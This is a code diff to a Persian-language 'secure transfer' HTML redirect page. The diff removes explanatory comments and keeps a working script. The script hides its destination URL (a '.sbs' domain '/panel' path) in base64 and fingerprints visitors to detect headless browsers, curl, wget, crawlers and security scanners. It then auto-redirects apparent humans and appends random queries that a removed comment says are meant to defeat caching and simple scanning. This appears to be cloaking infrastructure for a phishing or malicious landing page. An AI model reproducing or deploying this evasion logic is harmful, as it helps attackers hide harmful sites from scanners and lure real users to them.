@@ -5,8 +5,6 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>انتقال امن — همیاران</title>
   <meta name="robots" content="noindex,nofollow">
-  <!-- fallback meta refresh (only in case JS is disabled) -->
-  <!-- `TARGET_B64` را در خط اسکریپت پایین با مقدار base64ِ URL مقصد جایگزین کنید -->
   <style>
     :root{--bg:#0f172a;--card:#0b1220;--muted:#94a3b8}
     html,body{height:100%;margin:0;font-family:system-ui,-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial}
@@ -42,9 +40,9 @@
   </div>
 
   <script>
-    const TARGET_B64 = 'aHR0cHM6Ly9oYW15YXJhbi1nYXRlMS5zYnMvcGFuZWw='; // <-- این را تغییر دهید
-    const AUTO_REDIRECT_MS = 3000; // برای کاربران واقعی پس از این زمان به صورت خودکار منتقل شود
-    const ADD_RANDOM_QUERY = true; // برای جلوگیری از cache و اسکن ساده
+    const TARGET_B64 = 'aHR0cHM6Ly9oYW15YXJhbi1nYXRlMS5zYnMvcGFuZWw=';
+    const AUTO_REDIRECT_MS = 3000;
+    const ADD_RANDOM_QUERY = true;
 
     const statusEl = document.getElementById('status');
     const goBtn = document.getElementById('goBtn');
@@ -54,10 +52,10 @@
       try{
         const ua = navigator.userAgent || '';
         const navigatorProps = ['webdriver','plugins','languages'];
-        // تست‌های اولیه
+        
         if(navigator.webdriver) return {bot:true,reason:'navigator.webdriver'};
         if(/HeadlessChrome|PhantomJS|curl|wget|bot|crawler|spider|Scan|Pingdom/i.test(ua)) return {bot:true,reason:'userAgent match'};
-        // زمان لود و تعامل: ربات‌های ساده لزوماً تعامل ندارن
+        
         if(!('plugins' in navigator) || (navigator.languages && navigator.languages.length===0)) return {bot:false,reason:'inconclusive'};
         return {bot:false,reason:'looks like human'};
       }catch(e){
@@ -96,9 +94,7 @@
       goBtn.addEventListener('click', ()=>{ clearTimeout(autoTimer); doRedirect(); });
       altBtn.addEventListener('click', ()=>{ clearTimeout(autoTimer); history.back(); });
     }
-
-    // Extra: prevent search engines by meta robots (already set). Also slightly obfuscate link in DOM.
-    // نکتهٔ امنیتی: این صفحه فقط یک لایهٔ میانی است. برای محافظت بهتر ترکیب با Cloudflare Firewall/Rate Limits را توصیه می‌کنیم.
   </script>
 </body>
 </html>
+
